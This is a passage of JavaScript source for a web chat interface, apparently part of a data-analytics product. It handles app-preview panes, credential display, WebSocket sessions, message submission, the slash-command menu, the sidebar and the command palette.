  glossary_search: { text: "Checked your organization's glossary", href: "/catalog/semantics#glossary" },
};

function _definitionLookupLabel(toolName) {
  return _DEFINITION_LOOKUP_TOOLS[_bareToolName(toolName)] || null;
}

function _bareToolName(toolName) {
  if (!toolName) return "";
  return toolName.includes("__") ? toolName.slice(toolName.lastIndexOf("__") + 2) : toolName;
}

function _isPreviewTool(toolName) {
  return _PREVIEW_TOOL_NAMES.has(_bareToolName(toolName));
}

const _PREVIEW_RENDER_KINDS = new Set([
  "data_app_preview",
  "data_app_preview_refresh",
  "data_app_preview_close",
  "data_app_credentials",
]);

function _isPreviewDirective(result) {
  return !!(
    result &&
    typeof result === "object" &&
    typeof result.render === "string" &&
    _PREVIEW_RENDER_KINDS.has(result.render)
  );
}

function handlePreviewDirective(directive) {
  clearThinkingPlaceholder();
  switch (directive.render) {
    case "data_app_preview":
      renderDataAppPreview(directive);
      break;
    case "data_app_preview_refresh":
      refreshDataAppPreview(directive);
      break;
    case "data_app_preview_close":
      closeDataAppPreview(directive);
      break;
    case "data_app_credentials":
      renderDataAppCredentials(directive);
      break;
    default:
      break;
  }
}

let previewPaneEl = null;
let previewIframeEl = null;
let previewSlug = null;

/** Lazily build the split-pane DOM the first time a preview directive
 *  arrives. Idempotent — a second call just returns the existing pane. */
function _ensurePreviewPane() {
  if (previewPaneEl) return previewPaneEl;
  const shell = document.querySelector(".cloud-chat-shell");
  if (!shell) return null;

  const pane = document.createElement("aside");
  pane.className = "cloud-chat-preview-pane";
  pane.setAttribute("aria-label", "App preview");

  const head = document.createElement("header");
  head.className = "cloud-chat-preview-head";
  const title = document.createElement("span");
  title.className = "cloud-chat-preview-title";
  title.textContent = "App preview";
  head.appendChild(title);
  const closeBtn = document.createElement("button");
  closeBtn.type = "button";
  closeBtn.className = "btn btn-ghost btn-sm cloud-chat-preview-close-btn";
  closeBtn.setAttribute("aria-label", "Close preview");
  closeBtn.appendChild(iconEl("x"));
  closeBtn.onclick = () => _teardownPreviewPane();
  head.appendChild(closeBtn);
  pane.appendChild(head);

  const body = document.createElement("div");
  body.className = "cloud-chat-preview-body";

  const placeholder = document.createElement("div");
  placeholder.className = "cloud-chat-preview-placeholder";
  placeholder.innerHTML =
    '<span class="cloud-chat-preview-spinner" aria-hidden="true"></span>' +
    "<p>Setting up your app…</p>";
  body.appendChild(placeholder);

  const iframe = document.createElement("iframe");
  iframe.className = "cloud-chat-preview-iframe";
  iframe.setAttribute("title", "App preview");
  iframe.hidden = true;
  body.appendChild(iframe);

  pane.appendChild(body);
  shell.appendChild(pane);
  shell.classList.add("has-preview-pane");

  previewPaneEl = pane;
  previewIframeEl = iframe;
  return pane;
}

function _teardownPreviewPane() {
  if (previewIframeEl) {
    // Drop the iframe's document so the app's JS stops running once the
    // pane is gone rather than lingering as a detached background tab.
    previewIframeEl.src = "about:blank";
  }
  if (previewPaneEl) previewPaneEl.remove();
  const shell = document.querySelector(".cloud-chat-shell");
  if (shell) shell.classList.remove("has-preview-pane");
  previewPaneEl = null;
  previewIframeEl = null;
  previewSlug = null;
}

/** Install the preview cookie on the (same-site) app origin by hitting the
 *  preview-grant endpoint same-origin — the browser is already the chat user,
 *  so its `Set-Cookie` response lands the cookie the proxy's preview-token
 *  branch authorizes. This is done server-side (not `document.cookie`) because
 *  the cookie is `HttpOnly`, which a client-set cookie can never be — a browser
 *  silently discards an HttpOnly cookie assigned through `document.cookie`. */
async function _installPreviewCookie(slug) {
  try {
    await fetch(`/api/data-apps/${encodeURIComponent(slug)}/preview-grant`, {
      method: "POST",
      credentials: "same-origin",
    });
  } catch (err) {
    console.warn("could not obtain preview cookie", err);
  }
}

/** Extract a human message from a preview tool's non-directive result (the
 *  friendly `data_apps_disabled` payload, or a raised error). */
function _previewErrorMessage(result) {
  if (result && typeof result === "object") {
    return result.message || (result.error ? String(result.error) : "Preview unavailable.");
  }
  return "Preview unavailable.";
}

/** Render a preview tool's error inline as a small assistant message — used when
 *  no preview pane is open (the credentials tool opens none), so a disabled /
 *  failed result isn't silently dropped after its start card was suppressed. */
function _renderPreviewToolError(result) {
  const article = createMessageShell({ role: "assistant" });
  const bodyEl = article.querySelector(".msg-body");
  const p = document.createElement("p");
  p.className = "cloud-chat-preview-error";
  p.textContent = _previewErrorMessage(result);
  (bodyEl || article).appendChild(p);
  $("chat-messages").appendChild(article);
  maybeScrollToBottom();
}

/** Replace the placeholder spinner with an error message when a preview tool
 *  fails or the feature is disabled — so the pane never spins indefinitely.
 *  No-op if no pane is open. */
function _previewPaneError(result) {
  if (!previewPaneEl) return;
  const placeholder = previewPaneEl.querySelector(".cloud-chat-preview-placeholder");
  if (!placeholder) return;
  placeholder.innerHTML = "";
  const p = document.createElement("p");
  p.className = "cloud-chat-preview-error";
  p.textContent = _previewErrorMessage(result);
  placeholder.appendChild(p);
  placeholder.hidden = false;
  if (previewIframeEl) previewIframeEl.hidden = true;
}

async function renderDataAppPreview(directive) {
  const pane = _ensurePreviewPane();
  if (!pane) return;
  previewSlug = directive.slug;
  const placeholder = pane.querySelector(".cloud-chat-preview-placeholder");
  const iframe = previewIframeEl;

  if (!directive.url) {
    // First call — placeholder only, container isn't up yet.
    if (placeholder) placeholder.hidden = false;
    if (iframe) iframe.hidden = true;
    return;
  }

  // The cookie MUST land on the app origin before the iframe's first request,
  // so the proxy's preview-token branch authorizes it.
  await _installPreviewCookie(directive.slug);
  if (placeholder) placeholder.hidden = true;
  if (iframe) {
    iframe.hidden = false;
    iframe.src = directive.url;
  }
}

function refreshDataAppPreview(directive) {
  if (!previewIframeEl || previewSlug !== directive.slug) return;
  const src = previewIframeEl.src;
  // A bare re-assignment of the same `src` is a no-op in most browsers —
  // bounce through about:blank to force a real reload.
  previewIframeEl.src = "about:blank";
  requestAnimationFrame(() => {
    if (previewIframeEl) previewIframeEl.src = src;
  });
}

function closeDataAppPreview(directive) {
  if (previewSlug && directive.slug && previewSlug !== directive.slug) return;
  _teardownPreviewPane();
}

/** `data_app_credentials` is the terminal render of its turn (spec: "the
 *  shareable URL, rendered as the final element of the reply") — append
 *  it as its own assistant message block rather than folding it into the
 *  split pane, so it reads naturally in the transcript and survives
 *  scrollback after the pane is closed. */
function renderDataAppCredentials(directive) {
  const article = createMessageShell({ role: "assistant" });
  const bodyEl = article.querySelector(".msg-body");

  const wrap = document.createElement("div");
  wrap.className = "cloud-chat-credentials";

  const urlRow = document.createElement("p");
  urlRow.className = "cloud-chat-credentials-url";
  const link = document.createElement("a");
  link.href = directive.url;
  link.target = "_blank";
  link.rel = "noopener noreferrer";
  link.textContent = directive.url;
  urlRow.appendChild(link);
  wrap.appendChild(urlRow);

  if (directive.password) {
    const pwRow = document.createElement("p");
    pwRow.className = "cloud-chat-credentials-password";
    const label = document.createElement("span");
    label.className = "cloud-chat-credentials-label";
    label.textContent = "Password:";
    pwRow.appendChild(label);
    const code = document.createElement("code");
    code.textContent = directive.password;
    pwRow.appendChild(code);
    wrap.appendChild(pwRow);
  }

  bodyEl.appendChild(wrap);
  $("chat-messages").appendChild(article);
  attachMessageActions(article, directive.url || "");
  _markLatestAssistant(article);
  maybeScrollToBottom();
}

/** Make sure a WebSocket is live, or open one.
 *
 *  - Already open → no-op.
 *  - Have a ``currentChatId`` but no live WS → call ``openSession`` to
 *    re-mint a ticket against the SAME chat (resume after disconnect).
 *  - No current chat at all → create a brand-new one.
 *
 *  After whichever path runs, poll briefly for ``ws.readyState === 1``
 *  before resolving so callers can ``ws.send`` immediately. */
async function ensureWsReady() {
  if (ws && ws.readyState === 1) return;
  if (currentChatId) {
    await openSession(currentChatId);
  } else {
    await newChat();
  }
  for (let i = 0; i < 60; i++) {
    if (ws && ws.readyState === 1) return;
    await new Promise(r => setTimeout(r, 100));
  }
  throw new Error("WebSocket did not open within 6 s");
}

async function submitUserMessage(text) {
  if (!text) return;
  // 1. Clear the composer + hide the dashboard SYNCHRONOUSLY so the user
  //    gets immediate visual feedback that their submit was accepted.
  //    Without this they sit watching their typed "ahoj" + the
  //    capability cards for the ~5 s it takes the runner to boot, then
  //    everything flips at once — feels like the page is frozen.
  hideCapabilities();
  // The conversation is now under way, so the agent is settled for good: a
  // session's scope/memory/model/budget are fixed at creation and cannot be
  // re-pointed mid-thread. Disabling here rather than at session creation is
  // what keeps an empty "+ New chat" from dead-ending the picker.
  _markConversationStarted();
  const ta = $("chat-input");
  if (ta) {
    ta.value = "";
    autosizeComposer();
  }
  //    Part of that same synchronous feedback: if the newcomer coach-mark is
  //    up over this composer, take it down now. It sits BEFORE the socket
  //    wait deliberately — a runner that boots slowly, or fails outright,
  //    must not leave the card hanging over the input they just used.
  onboardingNoteComposerSubmitted();

  // 2. Make sure we have an open WS. For a brand-new chat this calls
  //    newChat() -> openSession(), and openSession wipes
  //    ``#chat-messages`` ``innerHTML`` on entry — so we deliberately
  //    DO NOT render the user bubble or the thinking placeholder yet,
  //    or they'd be gone in 50 ms. openSession also re-shows the
  //    dashboard when the (fresh, empty) session has no history; we
  //    hide it again after ensureWsReady so that side effect doesn't
  //    undo step 1.
  try {
    await ensureWsReady();
    hideCapabilities();
    // Re-asserted for exactly the reason hideCapabilities() is, one line up.
    // For a brand-new chat this submit created the session itself, so
    // openSession saw a session id it had never opened and reset the turns
    // flag — flipping the settled agent label back into a live picker
    // mid-send. The session is new; the conversation is not.
    _markConversationStarted();
  } catch (err) {
    setStatus(`Could not start chat: ${err.message}`, "error");
    showCapabilities();
    // Step 1 cleared the composer optimistically, but no turn ever started:
    // give the text back rather than destroying what they typed. A chat
    // backend that is down must cost a retry, not the message — otherwise
    // the only record of a long prompt is the user's memory of it.
    const taFailed = $("chat-input");
    if (taFailed && !taFailed.value) {
      taFailed.value = text;
      autosizeComposer();
    }
    // The turn never started, so nothing is settled — hand the picker back
    // with the dashboard. Otherwise a chat backend that is down strands the
    // reader on a label they cannot change and a conversation that never
    // began.
    _markConversationNotStarted();
    return;
  }
  // 3. Now ``#chat-messages`` is stable — render the user bubble and
  //    the thinking placeholder so the user sees their submit landed
  //    and the agent is working on it.
  // The conversation moved on — yesterday's follow-up chips are stale now,
  // and a previous turn that died without done/finalize must not leave its
  // bubble armed to swallow this turn's tokens.
  _resetStreamingState();
  _clearNextActions();
  renderMessage({ role: "user", content: text });
  lastUserText = text;
  if (_promptHistory[_promptHistory.length - 1] !== text) {
    _promptHistory.push(text);
  }
  _historyPos = _promptHistory.length;
  _historyDraft = "";
  _historyBrowsing = false;

  // Chat-driven onboarding: greet once, advance the journey, and — on an empty
  // Stack — resolve the knowledge gap right here before the model runs. When it
  // takes over the turn (gap-resolver card shown, or an "add X" command
  // handled) we skip the model send; the card's CTA calls submitUserMessage
  // again once the Stack is ready.
  try {
    if (await onboardingOnUserMessage(text, {})) {
      $("cancel-btn").hidden = true;
      return;
    }
  } catch (_) {
    /* onboarding is best-effort — never block the chat on it */
  }

  showThinkingPlaceholder();
  $("cancel-btn").hidden = false;
  // Arm the long-run nudge here — AFTER the onboarding takeover check, so a
  // turn that never reaches the model (gap resolver, "add X") doesn't start a
  // clock, and BEFORE the runner-ready wait, because a slow runner is exactly
  // the kind of wait worth being pinged about.
  onboardingNoteTurnStarted();

  // 4. Wait for the server's ``ready`` frame before sending the first
  //    ``user_msg`` — see ``serverReadyPromise`` definition for why.
  //    After the first ready of a session this promise is already
  //    resolved, so subsequent messages flow through with zero added
  //    latency.
  try {
    await Promise.race([
      serverReadyPromise,
      new Promise((_, rej) => setTimeout(() => rej(new Error("server-ready timeout 30 s")), 30000)),
    ]);
  } catch (err) {
    setStatus(`Runner did not become ready: ${err.message}`, "error");
    clearThinkingPlaceholder();
    // These two bail out before any frame is ever received, so the terminal-frame
    // handlers above never fire — disarm the nudge here or it would fire 45 s
    // later against a turn that died at the door.
    onboardingNoteTurnEnded();
    return;
  }
  if (!ws || ws.readyState !== 1) {
    setStatus("WebSocket dropped before runner became ready.", "error");
    clearThinkingPlaceholder();
    onboardingNoteTurnEnded();
    return;
  }
  ws.send(JSON.stringify({ type: "user_msg", text }));
}

/** Resize the composer textarea to fit its content, capped at 220px
 *  (matches max-height in chat.css). Reset to ``auto`` first so the
 *  scrollHeight calculation isn't dragged down by the last value. */
function autosizeComposer() {
  const ta = $("chat-input");
  if (!ta) return;
  ta.style.height = "auto";
  // Empty composer → keep the CSS height (rows / min-height). In the
  // centered empty-state column a textarea's scrollHeight comes back as
  // the column height rather than its single-line content height, which
  // would pin the composer at its 220px max on load. Only measure to
  // grow once there is actual content.
  if (ta.value.trim() === "") return;
  ta.style.height = Math.min(ta.scrollHeight, 220) + "px";
}

// #new-chat is the sidebar's +New chat button (topnav) OR the rail's
// "New chat" nav item, which is an <a href="/chat">. On /chat we start a
// fresh conversation IN PLACE, so preventDefault() stops the anchor from
// also navigating (a no-op for the topnav <button>). On every other page
// chat.js isn't loaded, so that same rail anchor just navigates to /chat.
$("new-chat")?.addEventListener("click", async (e) => {
  e.preventDefault();
  hideCapabilities();
  try {
    await newChat();
  } catch (err) {
    // Session creation failed (backend down / chat disabled): restore the
    // pre-conversation state instead of leaving a blank panel, and say why.
    // Fully reset the session pointers too — otherwise the next submit
    // would silently continue the PREVIOUS conversation over its old WS
    // while the user believes they're starting fresh.
    if (ws) { ws.close(); ws = null; }
    currentChatId = null;
    markActiveSidebar(null);
    $("chat-messages").innerHTML = "";
    showCapabilities();
    setThreadTitle(null);
    setStatus(`Could not start chat: ${err.message}`, "error");
  }
});

$("chat-form").onsubmit = async (e) => {
  e.preventDefault();
  const text = $("chat-input").value.trim();
  await submitUserMessage(text);
};

// Enter sends, Shift+Enter inserts a newline. IME composition is left
// alone (``isComposing`` is true while a CJK candidate is open —
// submitting then would eat the user's in-progress input). The textarea
// retains its native newline behavior for Shift+Enter so multi-line
// prompts stay possible. When the slash menu (see below) is open, arrow
// keys / Enter / Tab / Escape are claimed by it first.
$("chat-input").addEventListener("keydown", (e) => {
  if (_slashMenu.open) {
    if (e.key === "ArrowDown") {
      e.preventDefault();
      _slashMenu.selected = Math.min(_slashMenu.selected + 1, _slashMenu.filtered.length - 1);
      _refreshSlashMenuSelection();
      return;
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      _slashMenu.selected = Math.max(_slashMenu.selected - 1, 0);
      _refreshSlashMenuSelection();
      return;
    } else if (e.key === "Escape") {
      e.preventDefault();
      closeSlashMenu();
      return;
    } else if ((e.key === "Enter" || e.key === "Tab") && _slashMenu.filtered.length > 0) {
      // Only claim Enter/Tab when there's something to select — an empty
      // filtered list (no match for what's typed) leaves Enter free to
      // submit the message as-is instead of feeling "stuck".
      e.preventDefault();
      _slashMenu_selectCurrent();
      return;
    }
  }
  // Recall this chat's own sent messages, shell-history style. ArrowUp only
  // starts browsing once the caret is already at the very top of the draft
  // (so it first moves you through a multi-line message the normal way,
  // same as a shell only recalling once you're on the top line); once
  // browsing is underway either key keeps cycling regardless of caret
  // position so Up/Down chain smoothly like a real history stack.
  if (e.key === "ArrowUp" || e.key === "ArrowDown") {
    const ta = e.target;
    const atStart = ta.selectionStart === 0 && ta.selectionEnd === 0;
    if (e.key === "ArrowUp" && (_historyBrowsing || atStart) && _historyPos > 0) {
      e.preventDefault();
      if (_historyPos === _promptHistory.length) _historyDraft = ta.value;
      _historyPos -= 1;
      _historyBrowsing = true;
      ta.value = _promptHistory[_historyPos];
      // Caret to the END, matching the ArrowDown branch below and the shell
      // history this is modelled on. Caret-at-0 would put it in the one place
      // a reader recalling a prompt to tweak its tail has to navigate away
      // from — and, since `_historyBrowsing` makes further Up/Down
      // caret-independent, it bought nothing.
      const upPos = ta.value.length;
      ta.setSelectionRange(upPos, upPos);
      autosizeComposer();
      return;
    } else if (e.key === "ArrowDown" && _historyBrowsing && _historyPos < _promptHistory.length) {
      e.preventDefault();
      _historyPos += 1;
      ta.value = _historyPos === _promptHistory.length ? _historyDraft : _promptHistory[_historyPos];
      if (_historyPos === _promptHistory.length) _historyBrowsing = false;
      const pos = ta.value.length;
      ta.setSelectionRange(pos, pos);
      autosizeComposer();
      return;
    }
  }
  if (e.key === "Enter" && !e.shiftKey && !e.isComposing) {
    e.preventDefault();
    $("chat-form").dispatchEvent(new SubmitEvent("submit", { cancelable: true }));
  } else if (e.key === "Escape") {
    // Esc inside the composer drops focus so the global N hotkey
    // becomes available without yanking the cursor mid-thought.
    e.target.blur();
  }
});
$("chat-input").addEventListener("input", () => {
  // A manual edit ends history browsing — it becomes the new draft, so the
  // next ArrowUp starts over from the newest entry rather than resuming
  // mid-history with a value that no longer matches what's stored there.
  _historyPos = _promptHistory.length;
  _historyBrowsing = false;
  autosizeComposer();
  _onSlashInputChanged();
});

// ---------- Slash menu (skills/commands) ----------------------------------
// Typing "/" as the very first character of an otherwise-empty composer
// opens a filterable menu fed by GET /api/chat/skills (server-normalized,
// RBAC-filtered skills merged with — currently empty — recognized
// commands; see app/chat/skills_catalog.py). Continuing to type narrows
// the list by prefix; selecting (click, or Enter/Tab while a match is
// highlighted) inserts "/name " and closes the menu. A trailing space (or
// any character breaking the "/token" shape) closes it — the user is just
// typing a message that happens to start with a slash.

const _slashMenu = { open: false, selected: 0, filtered: [] };

// Fetched once per page load and cached — the catalog doesn't change
// mid-session. A failure (network blip, chat not granted after all)
// degrades to an empty list rather than blocking the composer.
let _slashItemsPromise = null;
function _fetchSlashItems() {
  if (!_slashItemsPromise) {
    _slashItemsPromise = api("/api/chat/skills")
      .then((body) => {
        const skills = (body?.skills || []).map((s) => ({ ...s, kind: "skill" }));
        const commands = (body?.commands || []).map((c) => ({ ...c, kind: "command" }));
        return [...skills, ...commands];
      })
      .catch(() => []);
  }
  return _slashItemsPromise;
}

/** Return the "/token" the user is currently typing, or null when the
 *  composer isn't in slash-trigger shape (must be the ENTIRE value —
 *  a slash anywhere else in a longer message is just punctuation). */
function _slashQuery() {
  const ta = $("chat-input");
  if (!ta) return null;
  const m = ta.value.match(/^\/(\S*)$/);
  return m ? m[1] : null;
}

function _renderSlashMenuResults(items, needle) {
  const ul = $("chat-slash-menu-results");
  if (!ul) return;
  ul.innerHTML = "";
  const q = needle.toLowerCase();
  const matches = items.filter((it) => !q || it.name.toLowerCase().startsWith(q));
  _slashMenu.filtered = matches;
  if (matches.length === 0) {
    const empty = document.createElement("li");
    empty.className = "cloud-chat-slash-menu-empty";
    empty.textContent = needle
      ? `No skill or command matches "/${needle}"`
      : "No skills or commands available.";
    ul.appendChild(empty);
    return;
  }
  if (_slashMenu.selected >= matches.length) _slashMenu.selected = 0;
  matches.forEach((it, i) => {
    const li = document.createElement("li");
    if (i === _slashMenu.selected) li.classList.add("is-selected");
    li.setAttribute("role", "option");
    li.setAttribute("aria-selected", i === _slashMenu.selected ? "true" : "false");

    const name = document.createElement("span");
    name.className = "cloud-chat-slash-menu-name";
    name.textContent = `/${it.name}`;
    li.appendChild(name);

    if (it.description) {
      const desc = document.createElement("span");
      desc.className = "cloud-chat-slash-menu-desc";
      desc.textContent = it.description;
      li.appendChild(desc);
    }

    if (it.source) {
      const src = document.createElement("span");
      src.className = "cloud-chat-slash-menu-source";
      src.textContent = it.source;
      li.appendChild(src);
    }

    li.onmouseenter = () => {
      _slashMenu.selected = i;
      _refreshSlashMenuSelection();
    };
    li.onclick = () => _slashMenu_selectCurrent();
    ul.appendChild(li);
  });
}

function _refreshSlashMenuSelection() {
  const ul = $("chat-slash-menu-results");
  if (!ul) return;
  const items = ul.querySelectorAll("li:not(.cloud-chat-slash-menu-empty)");
  items.forEach((li, i) => {
    const on = i === _slashMenu.selected;
    li.classList.toggle("is-selected", on);
    li.setAttribute("aria-selected", on ? "true" : "false");
    if (on) li.scrollIntoView({ block: "nearest" });
  });
}

async function openSlashMenu(needle) {
  const wrap = $("chat-slash-menu");
  if (!wrap) return;
  _slashMenu.open = true;
  _slashMenu.selected = 0;
  wrap.hidden = false;
  const items = await _fetchSlashItems();
  // The composer may have moved on (menu closed, query changed) while the
  // fetch was in flight — bail rather than render stale/mismatched results.
  if (!_slashMenu.open) return;
  _renderSlashMenuResults(items, needle);
}

function closeSlashMenu() {
  if (!_slashMenu.open) return;
  _slashMenu.open = false;
  _slashMenu.filtered = [];
  const wrap = $("chat-slash-menu");
  if (wrap) wrap.hidden = true;
}

function _slashMenu_selectCurrent() {
  const it = _slashMenu.filtered[_slashMenu.selected];
  if (!it) return;
  const ta = $("chat-input");
  if (ta) {
    ta.value = `/${it.name} `;
    autosizeComposer();
    ta.focus();
    ta.setSelectionRange(ta.value.length, ta.value.length);
  }
  closeSlashMenu();
}

function _onSlashInputChanged() {
  const q = _slashQuery();
  if (q === null) {
    closeSlashMenu();
    return;
  }
  openSlashMenu(q);
}

// Global keyboard shortcuts. ``targetIsTypeable`` keeps shortcuts
// inert while the user is typing in any input / textarea /
// contenteditable so a sentence like "no good" doesn't fire 'N'.
function _targetIsTypeable(el) {
  if (!el) return false;
  const tag = el.tagName;
  return tag === "INPUT" || tag === "TEXTAREA" || el.isContentEditable;
}
document.addEventListener("keydown", (e) => {
  if (e.metaKey || e.ctrlKey || e.altKey) return;
  if (_targetIsTypeable(e.target)) return;
  if (e.key === "n" || e.key === "N") {
    e.preventDefault();
    hideCapabilities();
    newChat();
  } else if (e.key === "/") {
    // Slash focuses the composer — matches Twitter/Discord muscle
    // memory for "start typing". Pre-existing Cmd+K still opens
    // the palette for switching conversations.
    e.preventDefault();
    const ta = $("chat-input");
    if (ta) ta.focus();
  }
});

$("cancel-btn").onclick = () => ws?.send(JSON.stringify({ type: "cancel" }));

// ---------- Sidebar mini-mode --------------------------------------------
// Collapse the sidebar to a 56px rail showing only icons + per-row
// initials. State persists via localStorage["agnes-chat-sidebar-
// collapsed"]; the head pre-paint script primes <html data-chat-
// sidebar="mini"> to avoid a flash on reload. On boot we promote that
// transitional signal to a .is-mini class on the shell, and swap each
// sidebar item's label text for the conversation's first character so
// the rail reads as a column of initials.

const _SIDEBAR_KEY = "agnes-chat-sidebar-collapsed";

function _firstInitial(s) {
  const t = (s && (s.title || "")).trim();
  if (t) return t[0].toUpperCase();
  // Fall back to a glyph rather than empty — Untitled chats still
  // need a tap target in the rail.
  return "•";
}

/** Apply mini-mode to the DOM. Idempotent. ``collapsed=true`` swaps
 *  every sidebar item's label for an initial; ``false`` restores the
 *  full title text from ``_sessionsCache`` (or the data-id lookup). */
function applySidebarCollapse(collapsed) {
  const shell = document.querySelector(".cloud-chat-shell");
  if (shell) shell.classList.toggle("is-mini", collapsed);
  document.documentElement.removeAttribute("data-chat-sidebar");

  const toggle = $("chat-sidebar-toggle");
  if (toggle) {
    toggle.setAttribute("aria-expanded", collapsed ? "false" : "true");
    toggle.setAttribute(
      "aria-label",
      collapsed ? "Expand sidebar" : "Collapse sidebar",
    );
    toggle.title = collapsed ? "Expand sidebar" : "Collapse sidebar";
  }

  // Swap labels for initials (or back). Done in JS rather than CSS
  // because no pure-CSS rule can extract the first character of an
  // arbitrary string. Cached titles are preserved in data-full-title
  // so we can restore them losslessly without re-reading the API.
  for (const li of _sidebarRows()) {
    const label = li.querySelector(".cloud-chat-list-label");
    if (!label) continue;
    if (collapsed) {
      if (!label.dataset.fullTitle) label.dataset.fullTitle = label.textContent;
      const cached = _sessionsCache.find(s => s.id === li.dataset.id);
      label.textContent = _firstInitial(cached || { title: label.dataset.fullTitle });
    } else {
      if (label.dataset.fullTitle) {
        label.textContent = label.dataset.fullTitle;
        delete label.dataset.fullTitle;
      }
    }
  }
}

function isSidebarCollapsed() {
  // Rail has no mini-collapse: the conversations column is a slide-open
  // panel (`history-open`), and the rail layout hides the un-collapse
  // toggle (chat.css). A stored "collapsed" flag would therefore trap the
  // user on an initials-only rail with no UI way back to the titled list.
  // Always report expanded under rail; the mini feature stays for topnav.
  if (document.documentElement.getAttribute("data-ui-layout") === "rail") return false;
  try { return localStorage.getItem(_SIDEBAR_KEY) === "1"; }
  catch (_) { return false; }
}

function setSidebarCollapsed(collapsed) {
  try {
    if (collapsed) localStorage.setItem(_SIDEBAR_KEY, "1");
    else localStorage.removeItem(_SIDEBAR_KEY);
  } catch (_) { /* storage disabled — state survives until reload */ }
  applySidebarCollapse(collapsed);
}

(function wireSidebarToggle() {
  const btn = $("chat-sidebar-toggle");
  if (!btn) return;
  // Apply whatever the pre-paint script primed. The sidebar items
  // aren't in the DOM yet (loadSidebar runs after) — we re-apply
  // there so initials show on first render.
  applySidebarCollapse(isSidebarCollapsed());
  btn.addEventListener("click", () => {
    setSidebarCollapsed(!isSidebarCollapsed());
  });
})();

// ---------- Cmd+K command palette ----------------------------------------
// Fuzzy search over the in-memory sessions cache (_sessionsCache),
// keyboard-driven. Cmd/Ctrl+K toggles open. Type to filter by title,
// arrow keys move the selection, Enter opens, Esc closes. The input
// is empty on each open so the user starts fresh.

const _palette = {
  open: false,
  selected: 0,
  filtered: [],
};

function _renderPaletteResults(q) {
  const ul = $("chat-palette-results");
  if (!ul) return;
  ul.innerHTML = "";
  const needle = q.trim().toLowerCase();
  const matches = _sessionsCache.filter(s => {
    if (!needle) return true;
    const t = (s.title || "Untitled chat").toLowerCase();
    return t.includes(needle) || s.id.toLowerCase().includes(needle);
  });
  _palette.filtered = matches;
  if (matches.length === 0) {
    const empty = document.createElement("li");
    empty.className = "cloud-chat-palette-empty";
    empty.textContent = needle
      ? `No conversation matches "${q}"`
      : "No conversations yet. Hit \"+ New chat\" to start.";
    ul.appendChild(empty);
    return;
  }
  if (_palette.selected >= matches.length) _palette.selected = 0;
  for (let i = 0; i < matches.length; i++) {
    const s = matches[i];
    const li = document.createElement("li");
    if (i === _palette.selected) li.classList.add("is-selected");
    li.dataset.id = s.id;
    li.setAttribute("role", "option");
    li.setAttribute("aria-selected", i === _palette.selected ? "true" : "false");

    const title = document.createElement("span");
    title.className = "cloud-chat-palette-title";
    title.textContent = s.title || "Untitled chat";
    li.appendChild(title);

    const meta = document.createElement("span");
    meta.className = "cloud-chat-palette-meta";
    meta.textContent = _palette_relativeTime(s.last_message_at || s.started_at);
    li.appendChild(meta);

    li.onmouseenter = () => {
      _palette.selected = i;
      _refreshPaletteSelection();
    };
    li.onclick = () => _palette_openCurrent();
    ul.appendChild(li);
  }
}

function _refreshPaletteSelection() {
  const ul = $("chat-palette-results");
  if (!ul) return;
  const items = ul.querySelectorAll("li:not(.cloud-chat-palette-empty)");
  items.forEach((li, i) => {
    const on = i === _palette.selected;
    li.classList.toggle("is-selected", on);
    li.setAttribute("aria-selected", on ? "true" : "false");
    if (on) li.scrollIntoView({ block: "nearest" });
  });
}

function _palette_relativeTime(ts) {
  if (!ts) return "";
  const d = new Date(ts);
  const diff = (Date.now() - d.getTime()) / 1000;
  if (diff < 60) return "just now";
  if (diff < 3600) return `${Math.round(diff / 60)} min ago`;
  if (diff < 86400) return `${Math.round(diff / 3600)} h ago`;
  if (diff < 7 * 86400) return `${Math.round(diff / 86400)} d ago`;
  return d.toLocaleDateString();
}

function _palette_openCurrent() {
  const s = _palette.filtered[_palette.selected];
  closePalette();
  if (s) openSession(s.id);
}

async function openPalette() {
  if (_palette.open) return;
  // Refresh the sidebar cache lazily — if the user opened Cmd+K very
  // soon after the page loaded, the cache may still be []. We don't
  // block the open, we just kick off a background refresh.
  if (_sessionsCache.length === 0) loadSidebar().catch(() => {});
  _palette.open = true;
  _palette.selected = 0;
  const wrap = $("chat-palette");
  if (wrap) wrap.hidden = false;
  const input = $("chat-palette-input");
  if (input) { input.value = ""; input.focus(); }
  _renderPaletteResults("");
}

function closePalette() {
  if (!_palette.open) return;
  _palette.open = false;
  const wrap = $("chat-palette");
  if (wrap) wrap.hidden = true;
  // Return focus to the composer so the user lands somewhere
  // expected after dismissing.
  const ta = $("chat-input");
  if (ta) ta.focus();
}

(function wirePalette() {
  document.addEventListener("keydown", (e) => {
    const isMod = e.metaKey || e.ctrlKey;
    if (isMod && (e.key === "k" || e.key === "K")) {
      e.preventDefault();
      if (_palette.open) closePalette(); else openPalette();
      return;
    }
    if (!_palette.open) return;
    if (e.key === "Escape") {
      e.preventDefault();
      closePalette();
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      _palette.selected = Math.min(_palette.selected + 1, _palette.filtered.length - 1);
      _refreshPaletteSelection();
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      _palette.selected = Math.max(_palette.selected - 1, 0);
      _refreshPaletteSelection();
    } else if (e.key === "Enter") {
      e.preventDefault();
      _palette_openCurrent();
    }
  });
  const input = $("chat-palette-input");
  if (input) {
    input.addEventListener("input", () => {
      _palette.selected = 0;
      _renderPaletteResults(input.value);
    });
  }
  document.querySelectorAll("[data-palette-close]").forEach(el => {
    el.addEventListener("click", closePalette);
  });
})();

// ---------------------------------------------------------------------------
// §5.3 Co-presence surface — pill, avatar cluster, invite/fork affordances
// ---------------------------------------------------------------------------

/** Full re-render of the co-presence host element.
 *
 *  Self-healing: called on every ``session_participants`` WebSocket frame so
 *  the roster is always current. Co fields are optional — if the server never
 *  sends this frame the host stays empty and the single-user UI is unchanged.
 */
function renderParticipants(participants) {
  const host = $("co-presence");
  if (!host) return;
  host.innerHTML = "";
  if (!participants.length) return;
  renderCoPresence(host, participants);
}

/** Render the co-drive pill, avatar cluster, and invite/fork button into host. */
function renderCoPresence(host, participants) {
  // Co-drive pill — styled via inline var(--ds-*) tokens so no raw hex is
  // introduced. chat.css is the canonical place for layout rules.
  const pill = document.createElement("span");
  pill.className = "co-drive-pill";
  pill.textContent = "Co-drive";
  pill.style.cssText = (
    "display:inline-flex;align-items:center;gap:4px;" +
    "padding:2px 8px;border-radius:var(--ds-radius-sm,4px);" +
    "background:var(--ds-surface-accent,var(--ds-surface-dim));" +
    "color:var(--ds-text-primary);font-size:var(--ds-text-xs,0.75rem);"
  );
  host.appendChild(pill);

